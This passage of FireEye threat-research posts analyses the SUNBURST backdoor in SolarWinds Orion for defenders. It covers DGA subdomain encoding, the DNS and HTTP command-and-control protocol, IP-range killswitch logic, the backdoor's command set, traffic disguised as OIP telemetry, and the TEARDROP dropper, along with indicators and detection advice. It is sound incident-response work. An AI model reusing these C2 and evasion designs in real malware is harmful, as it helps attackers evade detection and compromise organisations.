  class="code">.appsync-api.us-west-2[.]avsvmcloud[.]com</span></li> <li>
    <span
  class="code">.appsync-api.us-east-1[.]avsvmcloud[.]com</span></li> <li>
    <span
  class="code">.appsync-api.us-east-2[.]avsvmcloud[.]com</span></li> </ul>
 <p>A method named <span class="code">Update</span> is responsible for
  initializing cryptographic helpers for the generation of these
  random-looking C2 subdomains. Subdomains are generated by
  concatenating an encoded user ID with an encoding of the system's
  domain name. The C2 coordinator can recover the victim domain name
  from the encoded data and likely uses this to route SUNBURST to its
  final C2 server.</p>
 <p>A user ID is generated based on three values:</p>
 <ul> <li>MAC address of the first available, non-loopback network
  interface</li> <li>Domain name</li> <li>
    <span
    class="code">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</span>
  value</li> </ul>
 <p>SUNBURST takes the MD5 hash of these combined values and encodes it
  using a custom XOR scheme. We believe this value is used by UNC2452 to
  track unique victims.</p>
 <p>SUNBURST uses four different forms of subdomains to signify the
  operating mode of the backdoor. Each form contains slightly different
  information. However, in two of the forms, investigators can recover
  the domain names of victim organizations. We recommend reviewing DNS
  logs to confirm the presence of a victim’s domain in SUNBURST C2
  coordinator traffic.</p>
 <p>When SUNBURST is in its initial mode, it embeds the domain of the
  victim organization in its DGA-generated domain prefix. Once the
  malware transitions to an “active” mode, the malware uses the other
  two forms of subdomains. These do not include the AD domain, but
  instead include encodings of either the list of running and stopped
  services or a timestamp.</p>
 <p>The open-source community has done a fantastic job reverse
  engineering many of the subdomain forms. While we are not aware of any
  public decoder scripts that reverse all four possible encodings, most
  decoders focus on recovering the most useful information: the user ID
  and domain name embedded in the subdomains. We recommend that incident
  responders for victim organizations with access to DNS logs use these
  tools to confirm their AD domains are not embedded within SUNBURST
  generated DNS subdomains. Note that this does not indicate follow-on activity.</p>
 <p>The following sources may be referenced for decoding such domains:</p>
 <ul> <li>
    <a
  href="https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/">https://securelist.com/sunburst-connecting-the-dots-in-the-dns-requests/99862/</a></li> <li>
    <a
  href="https://github.com/RedDrip7/SunBurst_DGA_Decode/blob/main/decode.py">https://github.com/RedDrip7/SunBurst_DGA_Decode</a></li> <li>
    <a
  href="https://blog.cloudflare.com/a-quirk-in-the-sunburst-dga-algorithm/">https://blog.cloudflare.com/a-quirk-in-the-sunburst-dga-algorithm/</a></li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Diagram of actor operations and
    usage of SUNBURST</span></p>
 <h4>Command and Control</h4>
 <p>SUNBURST uses a two-part C2 protocol that involves both DNS and
  HTTP. In “passive” mode, the backdoor communicates with its C2
  coordinator via DNS and receives high-level updates to its state. For
  example, the C2 coordinator may tell the backdoor to go to sleep or
  spring into action. When the backdoor is in “active” mode, it
  communicates via HTTP to its final C2 server and receives detailed
  commands such as “spawn a process” or “transfer a file”.</p>
 <h4>DNS C2 and the C2 Coordinator Protocol</h4>
 <p>When communicating with the C2 coordinator, the backdoor
  continuously generates domains via its DGA. The backdoor delays
  execution for random intervals between generating domains. In some
  cases, this delay is up to 9 hours.</p>
 <p>If the C2 coordinator responds with a DNS A record, SUNBURST checks
  the resolved address against a hard-coded list of IP address blocks.
  If the address falls within a block, the backdoor transitions into an
  associated mode. The backdoor starts in the “passive” mode where it
  does nothing but check blocklists, sleep, and beacon via DNS until a
  transition is seen. Other modes are “active”, in which the malware
  communicates via HTTP, and “disabled”, in which the malware is
  permanently disabled. These modes and transitions are defined in the
  Modes of Operation section.</p>
 <p>The C2 coordinator may also respond with a DNS CNAME response. In
  this case, the malware uses the pointed-to domain from the CNAME
  response for HTTPS C2 communications. SUNBURST starts a thread to
  handle command execution and further C2 HTTP(S) callouts. As an
  investigator, if you see CNAME resolutions for subdomains of
  avsvmcloud[.]com, it‘s possible that UNC2452 initiated follow-on C2
  within the environment.</p>
 <p>Note, the malware must receive a DNS A record response pointing to
  one of the following subnets immediately prior to receiving a DNS
  CNAME response. Otherwise, the CNAME resolution will be ignored and
  treated as an error. In addition, for these subnets, the
  least-significant bytes from the A record IP address are parsed to
  obtain configuration data such as the proxy method to use, the URI
  scheme to use, and a delay value used in the HTTP thread.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">18.130.0.0/16</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">99.79.0.0/16</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">184.72.0.0/15</span></p> </td> </tr></tbody></table>
 <p>Subsequent DNS A record responses in the following subnet ranges
  cause the DGA beaconing to continue.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="156" valign="top"><p>
          <span class="code">8.18.144.0/23</span></p> </td> <td
        width="156" valign="top"><p>
          <span class="code">18.130.0.0/16</span></p> </td> <td
        width="156" valign="top"><p>
          <span class="code">71.152.53.0/24</span></p> </td> <td
        width="156" valign="top"><p>
          <span class="code">99.79.0.0/16</span></p> </td> </tr>
    <tr>
      <td width="156" valign="top"><p>
          <span class="code">87.238.80.0/21</span></p> </td> <td
        width="156" valign="top"><p>
          <span class="code">199.201.117.0/24</span></p> </td> <td
        width="156" valign="top"><p>
          <span class="code">184.72.0.0/15</span></p> </td> <td
        width="156"><p> </p> </td> </tr></tbody></table>
 <p>Otherwise, subsequent DNS A record responses in the following subnet
  ranges cause SUNBURST to terminate and update the configuration key
    <span class="code">ReportWatcherRetry</span> to a value that
  prevents further execution. This is the killswitch.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">10.0.0.0/8</span></p> </td> <td width="208" valign="top"><p>
          <span class="code">fc00:: - fe00::</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">96.31.172.0/24</span></p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">172.16.0.0/12</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">fec0:: - ffc0::</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">131.228.12.0/22</span></p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">192.168.0.0/16</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">ff00:: - ff00::</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">144.86.226.0/24</span></p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">224.0.0.0/3</span></p> </td> <td
        width="208" valign="top"><p>
          <span class="code">20.140.0.0/15</span></p> </td> <td
        width="208"><p> </p> </td> </tr></tbody></table>
 <p>While in “active” mode, the DGA subdomain encoding does not include
  victim machine domain name information. Instead, the DGA subdomains
  encode a timestamp or the list of stopped/running services. To
  transition back to “passive” mode, the malware operator may set the
  DNS server to resolve A records within the following IP ranges:</p>
 <table border="1" cellspacing="0" cellpadding="0" width="623"> <tbody>
    <tr>
      <td width="173" valign="top"><p>
          <span class="code">41.84.159.0/24</span></p> </td> <td
        width="164" valign="top"><p>
          <span class="code">74.114.24.0/21</span></p> </td> <td
        width="132" valign="top"><p>
          <span class="code">154.118.140.0/24</span></p> </td> <td
        width="155" valign="top"><p>
          <span class="code">217.163.7.0/24</span></p> </td> </tr></tbody></table>
 <p>If the malware is transitioned from the “active” mode back to
  “passive”, the C2 coordinator must repeat the activation process if
  the operator wants to re-activate the sample.</p>
 <h4>HTTP(S) C2</h4>
 <p>After receiving a CNAME DNS response with a new host to communicate
  with, SUNBURST starts a new thread to execute the method <span
  class="code">HttpHelper.Initialize</span>. This method is responsible
  for the C2 communications and dispatching. The HTTP thread begins by
  delaying for a configurable amount of time that is controlled by the
    <span class="code">SetTime</span> command. The HTTP thread delays
  for a minimum of one minute between callouts. The malware uses HTTP
  GET or POST requests. The sample disables certificate verification so
  it is possible to decrypt HTTPS traffic if SSL man-in-the-middle is performed.</p>
 <p>The malware constructs HTTP GET or POST request URIs from random
  selections of substrings. The scheme used depends on the A record
  received just prior to the CNAME DNS response. When sending a GET
  request, the malware adds an &quot;If-None-Match&quot; HTTP header
  that includes the encoded user ID. This likely allows the C2 server to
  determine which SUNBURST installation generated the request, further
  enabling multiplexing of C2 streams on a single server.</p>
 <p>In observed traffic, the C2 server employs steganography to hide
  data within HTTP response bodies and attempts to appear as benign XML
  related to .NET assemblies. Command data is spread across many GUID
  and hexadecimal strings. Commands are extracted from HTTP response
  bodies by searching for hexadecimal strings using the following
  regular expression: <span
  class="code">&quot;\{[0-9a-f-]{36}\}&quot;|&quot;[0-9a-f]{32}&quot;|&quot;[0-9a-f]{16}&quot;</span>.
  Matched substrings in the response are filtered for non-hex
  characters, joined together, and hex-decoded. Depending on the mode of
  operation, the malware may skip the steganography and send the encoded
  response in an HTTP response body.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: C2 response embeds commands in
    XML GUIDs</span></p>
 <p>In the received C2 response, the first DWORD value indicates the
  actual size of the message. This value is followed immediately by the
  message with optional junk bytes added. The extracted message is
  single-byte XOR decoded using the first byte of the message. The
  result is then DEFLATE decompressed. The first character of the
  decompressed data is an ASCII integer that maps to a command ID, with
  optional additional command arguments delimited by space characters.
  The supported commands are shown in the following table.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="0"> <tbody>
    <tr>
      <td width="216" valign="top"><p>
          <b>Command</b></p> </td> <td width="54" valign="top"><p>
          <b>ID</b></p> </td> <td width="414" valign="top"><p>
          <b>Operation</b></p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">Idle</span></p> </td> <td width="54"
        valign="top"><p>0 </p> </td> <td width="414" valign="top"><p>No
        operation </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">Exit</span></p> </td> <td width="54"
        valign="top"><p>1 </p> </td> <td width="414"
          valign="top"><p>Terminate the current thread. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">SetTime</span></p> </td> <td width="54"
        valign="top"><p>2 </p> </td> <td width="414"
          valign="top"><p>Sets the delay time between main event loop
          executions Delay is in seconds, and varies random between [.9
          * &lt;delay&gt;, 1.1 * &lt;delay&gt;] </p> <p>If the delay is
          &lt; 300 it is doubled on the next execution through the loop,
          this means it should settle onto an interval of around [5, 10]
        minutes </p> <p>o There is a second, unrelated delay routine
          that delays for a random interval between [16hrs, 83hrs] </p>
        <p> </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">CollectSystemDescription</span></p> </td>
        <td width="54" valign="top"><p>3 </p> </td> <td width="414"
          valign="top"><p>Profile the local system including hostname,
          username, OS version, MAC addresses, IP address, DHCP
          configuration, and domain information. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">UploadSystemDescription</span></p> </td>
        <td width="54" valign="top"><p>4 </p> </td> <td width="414"
          valign="top"><p>Perform an HTTP request to the specified URL,
          parse the results and send the response to the C2 server. </p>
      </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">RunTask</span></p> </td> <td width="54"
        valign="top"><p>5 </p> </td> <td width="414"
          valign="top"><p>Starts a new process with the given file path
          and arguments </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">GetProcessByDescription</span></p> </td>
        <td width="54" valign="top"><p>6 </p> </td> <td width="414"
          valign="top"><p>Returns a process listing. If no arguments are
          provided, returns just the PID and process name. 
          If an argument is provided, it also returns the parent PID and
          username and domain for the process owner. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">KillTask</span></p> </td> <td width="54"
        valign="top"><p>7 </p> </td> <td width="414"
          valign="top"><p>Terminate the given process, by PID. </p>
      </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">GetFileSystemEntries</span></p> </td> <td
        width="54" valign="top"><p>8 </p> </td> <td width="414"
          valign="top"><p>Given a path, and a match pattern recursively
          list files and directories.</p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">WriteFile</span></p> </td> <td width="54"
        valign="top"><p>9 </p> </td> <td width="414"
          valign="top"><p>Given a file path and a Base64-encoded string
          write the contents of the Base64 string to the given file
          path. Write using append mode. Delay for [1s, 2s] after
          writing is done. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">FileExists</span></p> </td> <td width="54"
        valign="top"><p>10 </p> </td> <td width="414"
          valign="top"><p>Tests whether the given file path exists. </p>
      </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">DeleteFile</span></p> </td> <td width="54"
        valign="top"><p>11 </p> </td> <td width="414"
          valign="top"><p>Deletes the specified file path. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">GetFileHash</span></p> </td> <td width="54"
        valign="top"><p>12 </p> </td> <td width="414"
          valign="top"><p>Compute the MD5 of a file at a given path and
          return the result as a hex string. If an argument is provided,
          it is the expected MD5 hash of the file and returns an error
          if the calculated MD5 differs. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">ReadRegistryValue</span></p> </td> <td
        width="54" valign="top"><p>13 </p> </td> <td width="414"
          valign="top"><p>Arbitrary registry read from one of the
          supported hives.</p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">SetRegistryValue</span></p> </td> <td
        width="54" valign="top"><p>14 </p> </td> <td width="414"
          valign="top"><p>Arbitrary registry write from one of the
          supported hives. </p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">DeleteRegistryValue</span></p> </td> <td
        width="54" valign="top"><p>15 </p> </td> <td width="414"
          valign="top"><p>Arbitrary registry delete from one of the
          supported hives.</p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">GetRegistrySubKeyAndValueNames</span></p>
      </td> <td width="54" valign="top"><p>16 </p> </td> <td width="414"
          valign="top"><p>Returns listing of subkeys and value names
          beneath the given registry path.</p> </td> </tr>
    <tr>
      <td width="216" valign="top"><p>
          <span class="code">Reboot</span></p> </td> <td width="54"
        valign="top"><p>17 </p> </td> <td width="414"
          valign="top"><p>Attempts to immediately trigger a system
        reboot. </p> </td> </tr></tbody></table>
 <p>SUNBURST sends messages back to the C2 server using a protocol that
  consists of UTF-8 strings and an appended 4-byte error DWORD and
  8-byte userID. These are bare DEFLATE compressed and single-byte XOR
  encoded with the XOR key prepended to the message. Message payloads of
  length 10,000 or less are turned into JSON documents that resemble the
  Orion Improvement Program (OIP) messages used legitimately by
  SolarWinds. Messages larger than 10,000 bytes are sent as-is in the
  HTTP request body.</p>
 <p>The fake OIP document contains the following fields:</p>
 <ul> <li>
    <span class="code">userId</span> – a unique identifier for the
    victim machine</li> <li>
    <span class="code">sessionID</span> – stores a new random GUID for
    each HTTP thread</li> <li>
    <span class="code">steps</span> – an array of objects that contain
    the following keys: <span class="code">Timestamp</span>, <span
    class="code">Index</span>, <span class="code">EventType</span>,
      <span class="code">EventName</span>, <span
    class="code">DurationMs</span>, <span class="code">Succeeded</span>,
    and <span class="code">Message</span>.</li> </ul>
 <p>The JSON key <span class="code">EventType</span> is hard-coded to
  the value <span class="code">Orion</span> and the <span
  class="code">EventName</span> is hard-coded to <span
  class="code">EventManager</span>. The encoded message to send to the
  C2 server is split up into random ranges, Base64-encoded, and stored
  in the <span class="code">Message</span> field of the objects in the
    <span class="code">steps</span> array. Not all objects in the <span
  class="code">steps</span> array contribute to the malware response.
  The integer in the <span class="code">Timestamp</span> field must have
  the <span class="code">0x2</span> bit set to indicate the contents of
  the <span class="code">Message</span> field are used in the malware
  response. <span class="code">steps</span> objects whose <span
  class="code">0x2</span> bit is clear in the <span
  class="code">Timestamp</span> field contain random data and are
  discarded when assembling the malware response. This may be an attempt
  to hinder analysis in the absence of the malware sample.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: HTTP callout masquerades as OIP protocol</span></p>
 <h4>Modes of Operation</h4>
 <p>As detailed in the DGA section, the malware has multiple modes of
  operation configured by the IP block that A records resolve to as well
  as depending on if CNAME records exist. These modes of operation are
  stored in internal enumerations. These mappings and values are
  described next.</p>
 <h5>Internal Modes</h5>
 <p>The following modes govern internal operations of the malware:</p>
 <table border="1" cellspacing="0" cellpadding="0" width="623"> <tbody>
    <tr>
      <td width="208" valign="top"><p>
          <b>Mode Name</b></p> </td> <td width="182" valign="top"><p>
          <b>Value</b></p> </td> <td width="234" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">Truncate</span></p> </td> <td width="182"
        valign="top"><p>3</p> </td> <td width="234"
          valign="top"><p>Disabled; the malware killswitch has been
          activated and the sample may never run again without external
          modification to the XML configuration on-disk.</p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">New</span></p> </td> <td width="182"
        valign="top"><p>4</p> </td> <td width="234"
          valign="top"><p>Passive mode; DGA subdomains encode the
          system’s domain name</p> </td> </tr>
    <tr>
      <td width="208" valign="top"><p>
          <span class="code">Append</span></p> </td> <td width="182"
        valign="top"><p>5</p> </td> <td width="234"
          valign="top"><p>Active mode; C2 beaconing will occur on next
          CNAME resolve or is already actively occurring. DGA domains
          encode either the <span class="code">userID</span> or the list
          of services</p> </td> </tr></tbody></table>
 <p>The mode values are written into the backdoor configuration key
    <span class="code">ReportWatcherRetry</span>. Investigators may
  consider recovering the malware configuration and inspecting this
  configuration value to determine the last running mode of the malware.</p>
 <p>The following transitions govern how IP block ranges are translated
  into running modes:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Transition Name</b></p> </td> <td width="312" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <span class="code">Atm</span></p> </td> <td width="312"
          valign="top"><p>Transition to Truncate</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <span class="code">Ipx</span></p> </td> <td width="312"
          valign="top"><p>Transition from Append to New</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <span class="code">ImpLink</span></p> </td> <td width="312"
          valign="top"><p>Transition to Truncate</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <span class="code">NetBios</span></p> </td> <td width="312"
          valign="top"><p>Transition to Append, either start or continue
          C2 beaconing</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <span class="code">Unknown</span></p> </td> <td width="312"
          valign="top"><p>Not an IPv4 or IPv6 address, exit and retry
          DGA later</p> </td> </tr></tbody></table>
 <p>The following diagram describes how the SUNBURST’s DGA DNS responses
  act as mode transitions to control the malware before HTTP-based C2
  beaconing has even begun:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/diagram.png" alt="" /></p>
 <p>Additionally, here is an annotated network log showing how a
  sequence of DNS resolutions can transition the malware mode:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/annotated-network-log.png" alt="" /></p>
 <p>To end this discussion of modes and transitions, a small note about
  the choices of these IP blocks. In cases such as the ImpLink IP blocks
  that activate the killswitch, it’s likely that the ranges were
  specifically chosen by the attacker to avoid being discovered by
  security researchers. In other cases, such as the NetBios and
  &quot;special&quot; NetBios IP blocks, the companies these blocks
  resolve to is likely irrelevant or at least beyond what can be
  definitively said without speculation.</p>
 <h4>Malware Flow Diagram</h4>
 <p>The following diagram provides a full picture of the malware's
  execution. Internally, SUNBURST uses a set of modes and transitions as
  described earlier. The names of these modes and transitions have no
  meaning. The malware authors purposely chose them as a form of
  obfuscation. When diagraming the malware's execution, these names were
  reused for clarity.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunburst-more/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Malware logic and decision states</span></p>
 <h4>Q&amp;A</h4>
 <p>
  <i>Is a system running blocklisted processes, services, or drivers
    safe from compromise?</i></p>
 <p>Sometimes, but not always. SUNBURST unconditionally exits if
  blocklisted processes or drivers are found and will not run until they
  are no longer detected. On the other hand, services are disabled by
  setting a registry value that controls startup initialization and are
  not explicitly stopped. As a result, a blocklisted service may still
  be running when the malware performs its service checks later. For
  this reason, it is possible for a victim system to be infected while a
  blocklisted service is running. Additionally, SUNBURST only attempts
  to disable a service once and updates its configuration to mark the
  service as disabled. Once the configuration is updated, the service is
  not treated as a blocklisted entry during subsequent execution. </p>
 <p>
  <i>Does observing one DGA encoding over another provide any
    information during incident response?</i></p>
 <p>Short answer: it provides a hint for where to look but isn’t a
  be-all tell-all alone. Noticing the DGA encoding change in network
  logs is a hint that the malware may have moved from New to Append or
  Append to New. This puts the malware in a mode where if a CNAME record
  is seen soon after, then HTTP C2 can begin. Incident response should
  focus on trying to identify CNAME records being successfully resolved
  instead of focusing on DGA encodings entirely. Identifying CNAME
  records is easier than tracking the malware mode through logs and a
  stronger signal.</p>
 <p>
  <i>What is the &quot;killswitch&quot;?</i></p>
 <p>FireEye discovered that certain DNS responses cause the malware to
  disable itself and stop further network activity. With the support and
  help of GoDaddy’s Abuse Team and the Microsoft Threat Intelligence
  Center, the domain used for resolving DGA domains was reconfigured to
  point to a sinkhole server under Microsoft’s control. The IP of this
  sinkhole server was specially chosen to fall into the range used by
  the malware to transition from its current mode (New or Append) into
  Truncate mode where it will be permanently inactive. In other words,
  SUNBURST infections should now be inoculated due to the killswitch.</p>
 <p>
  <i>When C2 communication occurs, is a CNAME record required?</i></p>
 <p>CNAME records are required for HTTP C2 beaconing to occur and are
  provided by the C2 coordinator to specify the final C2 server. C2
  activity must occur over a domain name provided via a CNAME record. It
  cannot occur directly via a raw IP. To initialize C2 beaconing, the
  backdoor first looks for an A record response from one of its special
  NetBios subnets and subsequently expects to receive a CNAME record.</p>
 <p>
  <i>If a DGA domain is decoded to a company domain name, is that
    company compromised?</i></p>
 <p>When the backdoor is in “passive” mode it uses the DGA encoding
  which embeds victim AD domain names. This means that any system where
  the backdoor is present may have started trying to contact DNS servers
  where an attacker could then activate the backdoor to begin active C2
  communications. In most cases this <i>did not</i> occur and backdoors
  for non-targets were disabled by the operator. Therefore, it cannot be
  assumed that an organization experienced follow-on activity if their
  domain is decoded from any DNS logs. Specifically, it’s only an
  indicator that the backdoor code was present and capable of being activated.</p>
 <h4>Public Contributions</h4>
 <p>We have seen substantial community contributions to our <a
    href="https://github.com/fireeye/sunburst_countermeasures">public
    SUNBURST GitHub repository</a>.</p>
 <p>We would like to publicly thank all contributors to this repository.
  Specifically, all FNV hashes embedded within SUNBURST have been
  brute-forced. This is a huge amount of compute power that members of
  the community provided free-of-charge to help others. We want to thank
  everyone who contributed hashes and specifically callout the Hashcat
  community, which organized to systematically break each hash. This was
  essential for breaking the final few hashes whose preimage were of
  considerable length.</p>
 <h4>Acknowledgements</h4>
 <p>Matthew Williams, Michael Sikorski, Alex Berry and Robert Wallace.</p>
 <p>
  <i>For additional information on UNC2452, register for our webinar, <a
      href="https://www.brighttalk.com/webcast/7451/462719">UNC2452:
      What We Know So Far</a>, on Tuesday, Jan. 12, at 8 a.m. PT/11 a.m. ET.</i></p>
http://www.fireeye.com/blog/threat-research/2020/12/sunburst-additional-technical-details.html2020-12-24T20:15:00.000Z2021-01-06T20:57:36.996ZHighly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise
Multiple Global Victims With SUNBURST Backdoornoemail@noemail.orgFireEye<h4>Executive Summary</h4>
 <ul> <li>We have discovered a global intrusion campaign. We are
    tracking the actors behind this campaign as UNC2452.</li>
    <li>FireEye discovered a supply chain attack trojanizing SolarWinds
    Orion business software updates in order to distribute malware we
    call SUNBURST. </li> <li>The attacker’s post compromise activity
    leverages multiple techniques to evade detection and obscure their
    activity, but these efforts also offer some opportunities for
  detection.</li> <li>The campaign is widespread, affecting public and
    private organizations around the world.</li> <li>FireEye is
    releasing signatures to detect this threat actor and supply chain
    attack in the wild. These are found on our public <a
      href="https://github.com/fireeye/sunburst_countermeasures">GitHub
    page</a>. FireEye products and services can help customers detect
    and block this attack.</li> </ul>
 <h4>Summary</h4>
 <p>FireEye has uncovered a widespread campaign, that we are tracking as
  UNC2452. The actors behind this campaign gained access to numerous
  public and private organizations around the world. They gained access
  to victims via trojanized updates to SolarWind’s Orion IT monitoring
  and management software. This campaign may have begun as early as
  Spring 2020 and is currently ongoing. Post compromise activity
  following this supply chain compromise has included lateral movement
  and data theft. The campaign is the work of a highly skilled actor and
  the operation was conducted with significant operational security.</p>
 <h4>SUNBURST Backdoor</h4>
 <p>SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds
  digitally-signed component of the Orion software framework that
  contains a backdoor that communicates via HTTP to third party servers.
  We are tracking the trojanized version of this SolarWinds Orion
  plug-in as SUNBURST.</p>
 <p>After an initial dormant period of up to two weeks, it retrieves and
  executes commands, called “Jobs”, that include the ability to transfer
  files, execute files, profile the system, reboot the machine, and
  disable system services. The malware masquerades its network traffic
  as the Orion Improvement Program (OIP) protocol and stores
  reconnaissance results within legitimate plugin configuration files
  allowing it to blend in with legitimate SolarWinds activity. The
  backdoor uses multiple obfuscated blocklists to identify forensic and
  anti-virus tools running as processes, services, and drivers.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarwinds/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: SolarWinds digital signature on
    software with backdoor</span></p>
 <p>Multiple trojanzied updates were digitally signed from March - May
  2020 and posted to the SolarWinds updates website, including:</p>
 <ul>
  <li>hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp</li> </ul>
 <p>The trojanized update file is a standard Windows Installer Patch
  file that includes compressed resources associated with the update,
  including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll
  component. Once the update is installed, the malicious DLL will be
  loaded by the legitimate SolarWinds.BusinessLayerHost.exe or
  SolarWinds.BusinessLayerHostx64.exe (depending on system
  configuration). After a dormant period of up to two weeks, the malware
  will attempt to resolve a subdomain of avsvmcloud[.]com. The DNS
  response will return a CNAME record that points to a Command and
  Control (C2) domain. The C2 traffic to the malicious domains is
  designed to mimic normal SolarWinds API communications. The list of
  known malicious infrastructure is available on FireEye’s <a
    href="https://github.com/fireeye/sunburst_countermeasures">GitHub page</a>.</p>
 <h4>Worldwide Victims Across Multiple Verticals</h4>
 <p>FireEye has detected this activity at multiple entities worldwide.
  The victims have included government, consulting, technology, telecom
  and extractive entities in North America, Europe, Asia and the Middle
  East. We anticipate there are additional victims in other countries
  and verticals. FireEye has notified all entities we are aware of being affected.</p>
 <h4>Post Compromise Activity and Detection Opportunities</h4>
 <p>We are currently tracking the software supply chain compromise and
  related post intrusion activity as UNC2452. After gaining initial
  access, this group uses a variety of techniques to disguise their
  operations while they move laterally (Figure 2). This actor prefers to
  maintain a light malware footprint, instead preferring legitimate
  credentials and remote access for access into a victim’s environment.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarwinds/fig2a.png" alt="" />
  <span class="type-XS">
    <br /> Figure 2: Post-compromise tactics</span></p>
 <p>This section will detail the notable techniques and outline
  potential opportunities for detection.</p>
 <p>
  <i>TEARDROP and BEACON Malware Used</i></p>
 <p>Multiple SUNBURST samples have been recovered, delivering different
  payloads. In at least one instance the attackers deployed a previously
  unseen memory-only dropper we’ve dubbed TEARDROP to deploy Cobalt
  Strike BEACON.</p>
 <p>TEARDROP is a memory only dropper that runs as a service, spawns a
  thread and reads from the file “gracious_truth.jpg”, which likely has
  a fake JPG header. Next it checks that HKU\SOFTWARE\Microsoft\CTF
  exists, decodes an embedded payload using a custom rolling XOR
  algorithm and manually loads into memory an embedded payload using a
  custom PE-like file format. TEARDROP does not have code overlap with
  any previously seen malware. We believe that this was used to execute
  a customized Cobalt Strike BEACON.</p>
 <p>
  <i>Mitigation</i>: FireEye has provided two Yara rules to detect
  TEARDROP available on our <a
  href="https://github.com/fireeye/sunburst_countermeasures">GitHub</a>.
  Defenders should look for the following alerts from FireEye HX:
  MalwareGuard and WindowsDefender:</p>
 <p>Process Information</p>
 <p style="margin-left: 40.0px;">file_operation_closed<br /> file-path*:
  “c:\\windows\\syswow64\\netsetupsvc.dll<br /> actor-process:<br />
  pid: 17900</p>
 <p>Window’s defender Exploit Guard log entries:
  (Microsoft-Windows-Security-Mitigations/KernelMode event ID 12)       
     </p>
 <p
  style="margin-left: 40.0px;">Process”\Device\HarddiskVolume2\Windows\System32\svchost.exe”
  (PID XXXXX) would have been blocked from loading the
  non-Microsoft-signed binary<br /> ‘\Windows\SysWOW64\NetSetupSvc.dll’</p>
 <p>
  <i>Attacker Hostnames Match Victim Environment</i></p>
 <p>The actor sets the hostnames on their command and control
  infrastructure to match a legitimate hostname found within the
  victim’s environment. This allows the adversary to blend into the
  environment, avoid suspicion, and evade detection.</p>
 <p>
  <b>Detection Opportunity</b></p>
 <p>The attacker infrastructure leaks its configured hostname in RDP SSL
  certificates, which is identifiable in internet-wide scan data. This
  presents a detection opportunity for defenders -- querying
  internet-wide scan data sources for an organization’s hostnames can
  uncover malicious IP addresses that may be masquerading as the
  organization. (Note: IP Scan history often shows IPs switching between
  default (WIN-*) hostnames and victim’s hostnames) Cross-referencing
  the list of IPs identified in internet scan data with remote access
  logs may identify evidence of this actor in an environment. There is
  likely to be a single account per IP address.</p>
 <p>
